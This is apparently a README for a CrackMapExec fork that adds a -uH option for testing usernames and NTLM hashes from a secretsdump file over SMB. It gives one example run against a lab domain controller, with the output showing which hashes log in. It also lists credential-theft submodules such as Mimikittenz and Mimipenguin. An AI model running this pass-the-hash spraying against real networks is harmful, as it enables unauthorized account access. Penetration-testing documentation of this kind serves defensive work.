![Supported Python versions](https://img.shields.io/badge/python-2.7-blue.svg)

# CrackMapExec fork to include features

## Features Added
** Test user and hashes from file with "secretdump" format (-uH parameter) **

###Example:

```
(CrackMapExec) ~/t/CrackMapExec> cme smb 192.168.56.100 -d ramlab -uH ../hashes.txt
SMB         192.168.56.100  445    DC01             [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC01) (domain:ramlab) (signing:True) (SMBv1:True)
SMB         192.168.56.100  445    DC01             [-] ramlab\testuser22 4139c3eafc40242c4317313ea08d00b7 STATUS_LOGON_FAILURE 
SMB         192.168.56.100  445    DC01             [-] ramlab\aaandy 4b291acc6fd3ae12f92ec3e587ab5abe STATUS_LOGON_FAILURE 
SMB         192.168.56.100  445    DC01             [+] ramlab\testuser2 85a165727adfbd6550626d515e4e1ef3 
SMB         192.168.56.100  445    DC01             [-] ramlab\mnfffi 70e81ac21b3b2aedf0b4b601a6226d2d STATUS_LOGON_FAILURE 
SMB         192.168.56.100  445    DC01             [-] ramlab\btoaan 0c391a86d139b2a17cf3260a06387558 STATUS_LOGON_FAILURE 
SMB         192.168.56.100  445    DC01             [+] ramlab\testuser3 4139c3eafc40242c4317313ea08d00b7 
SMB         192.168.56.100  445    DC01             [+] ramlab\testuser2 85a165727adfbd6550626d515e4e1ef3 
SMB         192.168.56.100  445    DC01             [-] ramlab\btoaan 0c391a86d139b2a17cf3260a06387558 STATUS_LOGON_FAILURE 
```

# Acknowledgments
**(These are the people who did the hard stuff)**

Original repository:
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) :+1:

This project was originally inspired by:
- [smbmap](https://github.com/ShawnDEvans/smbmap)
- [CredCrack](https://github.com/gojhonny/CredCrack)
- [smbexec](https://github.com/pentestgeek/smbexec)

Unintentional contributors:

- The [Empire](https://github.com/PowerShellEmpire/Empire) project
- @T-S-A's [smbspider](https://github.com/T-S-A/smbspider) script
- @ConsciousHacker's partial Python port of Invoke-obfuscation from the [GreatSCT](https://github.com/GreatSCT/GreatSCT) project

This repository contains the following repositories as submodules:
- [Impacket](https://github.com/CoreSecurity/impacket)
- [Pywinrm](https://github.com/diyan/pywinrm)
- [Pywerview](https://github.com/the-useless-one/pywerview)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [Invoke-Vnc](https://github.com/artkond/Invoke-Vnc)
- [Mimikittenz](https://github.com/putterpanda/mimikittenz)
- [NetRipper](https://github.com/NytroRST/NetRipper)
- [RandomPS-Scripts](https://github.com/xorrior/RandomPS-Scripts)
- [SessionGopher](https://github.com/fireeye/SessionGopher)
- [Mimipenguin](https://github.com/huntergregal/mimipenguin)

# Documentation, Tutorials, Examples
See the project's [wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki) for documentation and usage examples

# Installation
Please see the installation wiki page [here](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation).
